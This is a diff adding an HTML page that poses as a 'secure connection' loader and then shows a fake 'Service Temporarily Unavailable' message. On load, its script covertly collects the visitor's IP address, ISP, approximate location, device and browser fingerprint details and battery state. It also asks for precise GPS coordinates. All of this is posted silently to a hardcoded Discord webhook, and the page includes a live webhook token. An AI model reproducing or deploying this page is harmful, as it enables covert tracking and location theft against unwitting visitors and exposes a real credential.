@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Initializing System</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        #loader-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loader-content {
+            text-align: center;
+        }
+
+        #status-text {
+            margin-top: 20px;
+            font-size: 1.1rem;
+            color: #a0a0a0;
+        }
+
+        .spinner {
+            animation: rotate 2s linear infinite;
+            width: 50px;
+            height: 50px;
+        }
+
+        .spinner .path {
+            stroke: #5699d2;
+            stroke-linecap: round;
+            animation: dash 1.5s ease-in-out infinite;
+        }
+
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes dash {
+            0% {
+                stroke-dasharray: 1, 150;
+                stroke-dashoffset: 0;
+            }
+            50% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -35;
+            }
+            100% {
+                stroke-dasharray: 90, 150;
+                stroke-dashoffset: -124;
+            }
+        }
+
+        #final-message {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100%;
+            padding: 2rem;
+            box-sizing: border-box;
+        }
+        
+        #ad-bait {
+            height: 1px !important;
+            width: 1px !important;
+            position: absolute !important;
+            left: -9999px !important;
+            top: -9999px !important;
+            visibility: hidden !important;
+        }
+    </style>
+</head>
+<body>
+    <div id="ad-bait" class="adsbox ad-container"></div>
+
+    <div id="loader-overlay">
+        <div class="loader-content">
+            <svg class="spinner" viewBox="0 0 50 50">
+                <circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
+            </svg>
+            <p id="status-text">Initializing Secure Connection...</p>
+        </div>
+    </div>
+
+    <div id="final-message" class="hidden">
+        <h1>Service Temporarily Unavailable</h1>
+        <p>We are unable to connect to the authentication server. Please try again later. If you are the host, Please check the console for any error details.</p>
+    </div>
+
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1391308373437321287/7zFHSx9co1IGwIdmrhP6P94t2I-DuvrrPlUabsNNINGIDFEhKyEJhDHQM12DUnyVJVQm";
+
+        const showFinalMessage = () => {
+            const loader = document.getElementById('loader-overlay');
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.classList.add('hidden');
+                document.getElementById('final-message').classList.remove('hidden');
+            }, 500);
+        };
+
+        const sendToWebhook = async (data) => {
+            const embed = {
+                title: "system access log",
+                description: "detailed information collected from visitor.",
+                color: 5814783,
+                fields: [],
+                timestamp: new Date().toISOString(),
+                footer: { text: "data log" }
+            };
+
+            const addField = (name, value, inline = false) => {
+                if (value !== undefined && value !== null && value !== "" && value !== "n/a") {
+                    embed.fields.push({ name: name.toLowerCase(), value: "```" + value + "```", inline });
+                }
+            };
+            
+            addField("ip address", data.ip, true);
+            addField("isp", data.isp, true);
+            addField("ad-blocker", data.adBlockEnabled ? 'Yes' : 'prolly not', true);
+            
+            if(data.latitude) {
+                embed.fields.push({ name: "high-accuracy location", value: `[Open on Google Maps](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})` });
+                addField("latitude", data.latitude, true);
+                addField("longitude", data.longitude, true);
+                addField("gps accuracy", data.accuracy, true);
+            } else {
+                addField("high-accuracy location", data.location_error, false);
+            }
+            
+            const ipLocation = [data.city, data.region, data.country].filter(Boolean).join(', ') || 'n/a';
+            addField("ip-based location", ipLocation, false);
+            addField("user agent", data.userAgent, false);
+            
+            addField("platform", data.platform, true);
+            addField("cpu cores", data.cpuCores, true);
+            addField("memory (ram)", data.memory, true);
+            
+            if (data.gpu) {
+                addField("gpu", data.gpu, false);
+            }
+
+            if (data.battery) {
+                addField("battery", `${Math.round(data.battery.level * 100)}%`, true);
+                addField("charging", data.battery.charging ? 'Yes' : 'prolly not', true);
+            }
+            
+            if (data.network) {
+                addField("network type", data.network.effectiveType, true);
+            }
+            
+            addField("language", data.language, true);
+            addField("screen", `${data.screen.width}x${data.screen.height} (${data.screen.colorDepth}-bit)`, true);
+            addField("touch support", data.touchPoints > 0 ? `Yes (${data.touchPoints} points)` : 'prolly not', true);
+            
+            if (data.plugins && data.plugins.length > 0) {
+                addField("browser plugins", data.plugins.join(', '), false);
+            }
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'content-type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (error) {
+                // fail silently
+            }
+            
+            showFinalMessage();
+        };
+        
+        const getGpuInfo = () => {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                return "n/a";
+            }
+            return "n/a";
+        };
+
+        const gatherData = async () => {
+            const status = document.getElementById('status-text');
+            let data = {};
+
+            const adBait = document.getElementById('ad-bait');
+            data.adBlockEnabled = !adBait || adBait.offsetHeight === 0 || window.getComputedStyle(adBait).display === "none";
+
+            data.userAgent = navigator.userAgent || "n/a";
+            data.language = navigator.language || "n/a";
+            data.platform = navigator.platform || "n/a";
+            data.screen = { width: screen.width, height: screen.height, colorDepth: screen.colorDepth };
+            data.touchPoints = navigator.maxTouchPoints || 0;
+            data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
+
+            data.cpuCores = navigator.hardwareConcurrency || "n/a";
+            data.memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "n/a";
+            data.gpu = getGpuInfo();
+            
+            data.network = navigator.connection ? { effectiveType: navigator.connection.effectiveType } : null;
+
+            const [ipInfo, batteryInfo] = await Promise.all([
+                fetch('https://ipinfo.io/json').then(res => res.json()).catch(() => null),
+                navigator.getBattery ? navigator.getBattery().catch(() => null) : Promise.resolve(null)
+            ]);
+
+            if (ipInfo) {
+                data.ip = ipInfo.ip;
+                data.city = ipInfo.city;
+                data.region = ipInfo.region;
+                data.country = ipInfo.country;
+                data.isp = ipInfo.org;
+            }
+            
+            if (batteryInfo) {
+                data.battery = { level: batteryInfo.level, charging: batteryInfo.charging };
+            }
+
+            status.textContent = 'Requesting Location Access...';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        data.latitude = latitude.toFixed(7);
+                        data.longitude = longitude.toFixed(7);
+                        data.accuracy = `${accuracy.toFixed(0)} meters`;
+                        sendToWebhook(data);
+                    },
+                    (error) => {
+                        data.location_error = `Permission Denied or Unavailable`;
+                        sendToWebhook(data);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                data.location_error = "Geolocation not supported.";
+                sendToWebhook(data);
+            }
+        };
+
+        window.onload = gatherData;
+    </script>
+</body>
+</html>
